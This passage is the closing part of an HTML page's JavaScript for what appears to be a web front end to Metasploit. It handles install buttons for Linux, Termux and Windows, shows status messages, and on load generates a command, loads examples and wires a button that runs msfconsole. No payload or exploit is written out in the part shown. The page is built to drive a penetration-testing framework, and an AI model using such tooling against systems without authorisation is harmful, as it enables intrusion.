                showStatus('Metasploit installation is not directly supported on Windows via this interface.', 'orange');
                // Re-enable buttons immediately for Windows as no backend process is started
                linuxButton.disabled = false;
                termuxButton.disabled = false;
                windowsButton.disabled = false;
            } else {
                showMessageModal('Install Metasploit', `Metasploit installation is not automatically supported for your operating system (${navigator.platform}). Please install Metasploit manually.`);
                showStatus('Metasploit installation is not supported for this system.', 'orange');
                // Re-enable buttons immediately for unsupported OS
                linuxButton.disabled = false;
                termuxButton.disabled = false;
                windowsButton.disabled = false;
            }
        }


        // Initial setup
        document.addEventListener('DOMContentLoaded', () => {
            generateCommand(); // Generate command on page load
            loadExamples(); // Load examples for the Examples tab
            document.getElementById('run_msfconsole_button').addEventListener('click', runMsfconsole);
            
            // New event listeners for specific installation buttons
            document.getElementById('install_msf_linux_button').addEventListener('click', () => handleMsfInstallation('linux'));
            document.getElementById('install_msf_termux_button').addEventListener('click', () => handleMsfInstallation('termux'));
            document.getElementById('download_msf_windows_button').addEventListener('click', () => handleMsfInstallation('windows'));
        });
    </script>
</body>
</html>
